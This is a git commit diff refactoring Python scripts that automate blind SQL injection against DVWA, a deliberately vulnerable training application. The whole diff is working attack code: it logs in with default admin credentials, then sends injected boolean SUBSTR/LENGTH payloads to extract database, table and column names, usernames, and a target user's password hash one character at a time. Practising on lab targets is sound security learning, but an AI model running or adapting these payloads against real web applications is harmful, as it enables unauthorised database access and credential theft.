a55db4466ed8393386485e99d8fb85c1cf0bfde9
Gerry Merino <merino.gerry@gmail.com>
2024-04-22 16:57:39 -0500

    Light refactoring of blind_sqli scripts: main_low and utils

--- blind_sqli/main_low.py
+++ blind_sqli/main_low.py
@@ -1,136 +1,150 @@
+from utils import DVWASQLiResponseParser, DVWASessionProxy, SecurityLevel
+import string
 
-from utils import *
-def get_query_result(s, sqli_blind_url, query, *args):
+def get_query_result(session, target_url, query, *query_parameters):
+    """
+    Executes a SQL query against a specified URL and checks for the presence of a specific response.
+
+    :param session: The session object to maintain state across requests.
+    :param target_url: The URL where the SQL injection vulnerability exists.
+    :param query: The SQL query to be executed.
+    :param query_parameters: Parameters to format the query string.
+    :return: True if the query indicates presence (e.g., a condition is met), False otherwise.
+    """
     try:
-        concrete_query = query.format(*args)
-        response = s.get(f"{sqli_blind_url}?id={concrete_query}&Submit=Submit#")
+        # Formats the query with provided parameters.
+        formatted_query = query.format(*query_parameters)
+        # Sends a request to the target URL with the SQL query.
+        response = session.get(f"{target_url}?id={formatted_query}&Submit=Submit#")
+        # Parses the response to determine if the query's condition was met.
         parser = DVWASQLiResponseParser(response)
         return parser.check_presence("exist")
-    except AttributeError as e:
+    except AttributeError as error:
         return False
 
 if __name__ == "__main__":
-    BASE_URL = "http://10.10.154.7"
-    sqli_blind_url = f"{BASE_URL}/vulnerabilities/sqli_blind"
+    # Prompt user for the DVWA server IP address
+    dvwa_server_ip = input("Enter the DVWA server IP address: ")
+    base_url = f"http://{dvwa_server_ip}"
+    sqli_page_url = f"{base_url}/vulnerabilities/sqli_blind"
     
-    with DVWASessionProxy(BASE_URL) as s:
-        s.security = SecurityLevel.LOW
+    # Initialize session and set security level.
+    with DVWASessionProxy(base_url) as session:
+        session.security = SecurityLevel.LOW
 
+        # Query to find the length of the database name.
+        db_name_length_query = "1' AND LENGTH(DATABASE()) = {} %23"
+        db_name_length = 0
+        for length in range(10):
+            if get_query_result(session, sqli_page_url, db_name_length_query, length):
+                print(f"[+] Length of the database name is {length}")
+                db_name_length = length
+                break
 
-        query = "1' AND LENGTH(DATABASE()) = {} %23"
-        length = 0
-        for i in range(10):
-            if get_query_result(s, sqli_blind_url, query, i):
-                print(f"[+] The DB's name length is {i}")
-                length = i
+        # Query to find the actual database name one character at a time.
+        db_name_query = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}'%23"
+        db_name = []
 
-        
-        query = "1' AND SUBSTRING(DATABASE(), {}, 1) = '{}'%23"
-        dbname = []
-
-        for i in range(1, length+1):
-            for c in string.ascii_lowercase:
-                if get_query_result(s, sqli_blind_url, query, i, c):
-                    dbname.append(c)
+        for position in range(1, db_name_length + 1):
+            for character in string.ascii_lowercase:
+                if get_query_result(session, sqli_page_url, db_name_query, position, character):
+                    db_name.append(character)
                     break
-        dbname = "".join(dbname)
-        print(f'[+] Found a database with name: {dbname}')
+        db_name = "".join(db_name)
+        print(f'[+] Database name discovered: {db_name}')
         
-        
-        query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_type='base table' AND table_schema='{}')='{}'%23"
-        n_tables = 0
-        for i in range(1, 10):
-            if get_query_result(s, sqli_blind_url, query, dbname, i):
-                print(f"[+] It has {i} tables")
-                n_tables = i
+        # Query to count the number of tables in the database.
+        tables_count_query = "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{}')='{}'%23"
+        tables_count = 0
+        for count in range(1, 10):
+            if get_query_result(session, sqli_page_url, tables_count_query, db_name, count):
+                print(f"[+] Number of tables in the database: {count}")
+                tables_count = count
                 break
 
-
-        query = "1' AND SUBSTR((SELECT table_name from information_schema.tables WHERE table_type='base table' AND table_schema='{}' {} LIMIT 1),{},1)='{}'%23"
+        # Query to find the names of tables one character at a time.
+        table_name_query = "1' AND SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema='{}' {} LIMIT 1),{},1)='{}'%23"
         
-        found_tables = [[] for _ in range(n_tables)]
-        completion = ""
-        for i in range(n_tables):        
-            for j in range(1, 10):
-                for c in string.ascii_lowercase:
-                    if get_query_result(s, sqli_blind_url, query, dbname, completion, j, c):
-                        found_tables[i].append(c)
+        found_tables = [[] for _ in range(tables_count)]
+        exclusion_clause = ""
+        for table_index in range(tables_count):        
+            for position in range(1, 10):
+                for character in string.ascii_lowercase:
+                    if get_query_result(session, sqli_page_url, table_name_query, db_name, exclusion_clause, position, character):
+                        found_tables[table_index].append(character)
                         break
-            print("\t","".join(found_tables[i]))
-            completion += f" AND table_name <> '{''.join(found_tables[i])}'"
-        
-            
-    
-    users_table = input("Type the tabname to attack: ")
-    query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}'%23"
-    
-    n_columns = 0
-    for i in range(1, 10):
-        if get_query_result(s, sqli_blind_url, query, users_table, i):
-            print(f"[+] It has {i} columns")
-            n_columns = i
-            break
+            print("\t", "".join(found_tables[table_index]))
+            exclusion_clause += f" AND table_name <> '{''.join(found_tables[table_index])}'"
 
-    query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"
-    
-    found_columns = [[] for _ in range(n_columns)]
-    
-    print("[!] In order to speed up, try to press CTRL+C when you find the user and password columns")
-    try:
-        for i in range(n_columns):        
-            for j in range(1, 12):
-                for c in string.ascii_lowercase:
-                    if get_query_result(s, sqli_blind_url, query, users_table, i, j, c):
-                        found_columns[i].append(c)
-                        
-                        break
-            print("\t","".join(found_columns[i]))
-    except KeyboardInterrupt as e:
-        print("\nSkipping this phase!")
-    
 
-    users_column = input("Type the name of the column containing usernames: ")
-    passwords_column = input("Type the name of the column containing passwords: ")
-
-    query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"
-    
-    found_users = [[] for _ in range(10)]
-    
-    print("[!] In order to speed up, try to press CTRL+C when you find the target user")
-    try:
-        for i in range(10):        
-            for j in range(1, 12):
-                for c in string.ascii_letters+string.digits:
-                    if get_query_result(s, sqli_blind_url, query, users_column, users_table, i, j, c):
-                        found_users[i].append(c)
-                        
-                        break
-            print("|","_"*10,"".join(found_users[i]))
-    except KeyboardInterrupt as e:
-        print("\n Skipping this phase!")
-    
-    username = input("Type the name of the target user: ")
-
-    query = "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={}%23"
-    pwd_length = 0
-    for i in range(100):
+        # Prompt user to specify which table to analyze further.
+        target_table_name = input("Enter the name of the table to analyze: ")
+        # Query to determine the number of columns in the target table.
+        columns_count_query = "1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{}')='{}'%23"
         
-        if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, i ):
-            pwd_length = i
-            print(f"[+] The password length is: {i}")
-        
-    query = "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}'%23"
-    password = []
-    for j in range(1, pwd_length+1):
-        
-        for c in string.ascii_letters+string.digits:
-            
-            if get_query_result(s, sqli_blind_url, query, passwords_column, users_table, users_column, username, j, c):
-                password.append(c)
-                
+        columns_count = 0
+        for count in range(1, 10):
+            if get_query_result(session, sqli_page_url, columns_count_query, target_table_name, count):
+                print(f"[+] Number of columns in '{target_table_name}': {count}")
+                columns_count = count
                 break
-    print("[+] Password is: ","".join(password))  
-    
 
+        # Query to find the names of columns in the target table one character at a time.
+        column_name_query = "1' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{}' LIMIT {}, 1),{},1)='{}'%23"
         
+        found_column_names = [[] for _ in range(columns_count)]
+        
+        print("[!] Attempting to accelerate the process. Press CTRL+C when you find the targeted columns.")
+        try:
+            for column_index in range(columns_count):        
+                for character_position in range(1, 12):
+                    for character in string.ascii_lowercase:
+                        if get_query_result(session, sqli_page_url, column_name_query, target_table_name, column_index, character_position, character):
+                            found_column_names[column_index].append(character)
+                            break
+                print("\t", "".join(found_column_names[column_index]))
+        except KeyboardInterrupt:
+            print("\nUser discovery halted!")
 
+        # User inputs for targeting specific columns within the chosen table.
+        users_column = input("Enter the username column name: ")
+        passwords_hash_column = input("Enter the password hash column name: ")
+
+        # Query to extract values from the specified column of the target table, one character at a time.
+        value_extraction_query = "1' AND SUBSTR((SELECT {} FROM {} LIMIT {}, 1),{},1)='{}'%23"
+        
+        found_users = [[] for _ in range(10)]
+        
+        print("[!] To further speed up the process, press CTRL+C when you find the target user")
+        try:
+            for user_index in range(10):        
+                for character_position in range(1, 12):
+                    for character in string.ascii_letters + string.digits:
+                        if get_query_result(session, sqli_page_url, value_extraction_query, users_column, target_table_name, user_index, character_position, character):
+                            found_users[user_index].append(character)
+                            break
+                print("|", "_"*10, "".join(found_users[user_index]))
+        except KeyboardInterrupt:
+            print("\nUser discovery halted!")
+
+        # User input for specifying the target username for password hash extraction.
+        target_username = input("Enter the target username for password hash extraction: ")
+
+        # Query to determine the length of the password for the specified user.
+        password_hash_length_query = "1' AND LENGTH((SELECT {} FROM {} WHERE {}='{}'))={}%23"
+        password_hash_length = 0
+        for length in range(1, 100):
+            if get_query_result(session, sqli_page_url, password_hash_length_query, passwords_hash_column, target_table_name, users_column, target_username, length):
+                password_hash_length = length
+                print(f"[+] Password hash length for '{target_username}': {length}")
+                break
+
+        # Query to extract the password for the specified user, one character at a time.
+        password_extraction_query = "1' AND SUBSTR((SELECT {} FROM {} WHERE {}='{}' LIMIT 1), {}, 1)='{}'%23"
+        password_hash = []
+        for character_position in range(1, password_hash_length + 1):
+            for character in string.ascii_letters + string.digits:
+                if get_query_result(session, sqli_page_url, password_extraction_query, passwords_hash_column, target_table_name, users_column, target_username, character_position, character):
+                    password_hash.append(character)
+                    break
+        print(f"[+] Password hash for '{target_username}': {''.join(password_hash)}")
--- blind_sqli/utils.py
+++ blind_sqli/utils.py
@@ -2,103 +2,100 @@ import requests
 from bs4 import BeautifulSoup
 from enum import Enum
 import string
+import urllib
 
-
+# Enum to represent the various security levels available in DVWA.
 class SecurityLevel(Enum):
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     IMPOSSIBLE = "impossible"
+
+# Class to manage CSRF tokens for DVWA sessions.
 class CSRFManager:
 
+    # Decorator to automatically set CSRF token for requests.
     @staticmethod
     def set_csrf_token(func):
         def wrapper(*args, **kwargs):
-            
-            
-            user_token = CSRFManager.get_token(args[0]._session, args[0].url)
-            
-            if user_token != None:
-                args[0].user_token = user_token["value"]
-                                         
+            # Retrieve CSRF token and update the session with it.
+            token, _ = CSRFManager.get_token(args[0]._session, args[1])
+            if token is not None:
+                args[0].user_token = token["value"]
             return func(*args, **kwargs)
         return wrapper
     
+    # Method to get CSRF token from a given URL.
     @staticmethod
     def get_token(session:requests.Session, url:str):
-        
         response = session.get(url)
         soup = BeautifulSoup(response.text, 'html.parser')
-        user_token = soup.find("input", {"name": "user_token"})
-        return user_token
+        csrf_token = soup.find("input", {"name": "user_token"})
+        return csrf_token, response.url
 
+# Class to manage session and security level for DVWA.
 class DVWASessionProxy:
     login_data = {
-            "username": "admin",
-            "password": "password",
-            "Login": "Login"
+        "username": "admin",
+        "password": "password",
+        "Login": "Login"
     }
+
     def __init__(self, url):
-        super().__init__()
         self._session = requests.Session()
         self.url = f"{url}/login.php"
-        self.data = {}
+        self.data = {}  # Data dictionary to store session-specific data such as CSRF tokens.
     
+    # Getter for security level.
     @property
     def security(self):
         return self._session.cookies.get_dict()["security"]
     
+    # Setter for security level, allowing to change the security level of DVWA.
     @security.setter
-    def security(self, security_level):
-
-        self._session.cookies.pop("security")
+    def security(self, security_level: SecurityLevel):
+        self._session.cookies.pop("security", None)  # Remove existing security cookie if any.
         self._session.cookies.set("security", security_level.value)
  
+    # Getter for user CSRF token.
     @property
     def user_token(self):
         return self.data["user_token"]
     
+    # Setter for CSRF token.
     @user_token.setter
     def user_token(self, value):
         self.data["user_token"] = value
 
     def __enter__(self):
-        
-        response = self.login(self.url, data= {**self.data, **DVWASessionProxy.login_data}) 
+        # Login to DVWA upon entering the context.
+        self.post(self.url, data= {**self.data, **DVWASessionProxy.login_data}) 
         return self
     
-    def get(self, url ,headers=None, params=None, cookies=None):
-        response = self._session.get(url, headers=headers, params=params, cookies=cookies)
-        self.url = response.url
-        return response
+    # Generic GET request wrapper.
+    def get(self, url ,headers=None, params=None):
+        return self._session.get(url, headers=headers, params=params)
     
+    # Generic POST request wrapper, automatically includes CSRF token if available.
     @CSRFManager.set_csrf_token
-    def login(self, url, headers=None, data=None):
-
-        response = self._session.post(url, headers=headers, data={**self.data, **data})
-        
-
+    def post(self, url ,headers=None, data=None):
+        return self._session.post(url, headers=headers, data={**self.data, **data})
     
-    def post(self, url ,headers=None, data=None, cookies=None):
-
-        response = self._session.post(url, headers=headers, data=data, cookies=cookies)
-        
-
-        return response
-
-    
+    # Close session upon exiting the context.
     def __exit__(self, exc_type, exc_val, exc_tb):
         self._session.close()
 
+# Class to parse responses from DVWA for SQL injection testing.
 class DVWASQLiResponseParser:
     def __init__(self, response):
         self.response = response
 
+    # Method to extract and return an "interesting" value from the response, for validation purposes.
     def get_interesting_value(self):
-        
         soup = BeautifulSoup(self.response.content, 'html.parser')
         interesting_value = soup.find("pre")
         return interesting_value
             
-    def check_presence(self, string):
-        return string in self.get_interesting_value().text
+    # Check if a specific string is present in the "interesting" value, indicating success/failure.
+    def check_presence(self, target_string):
+        return target_string in self.get_interesting_value().text
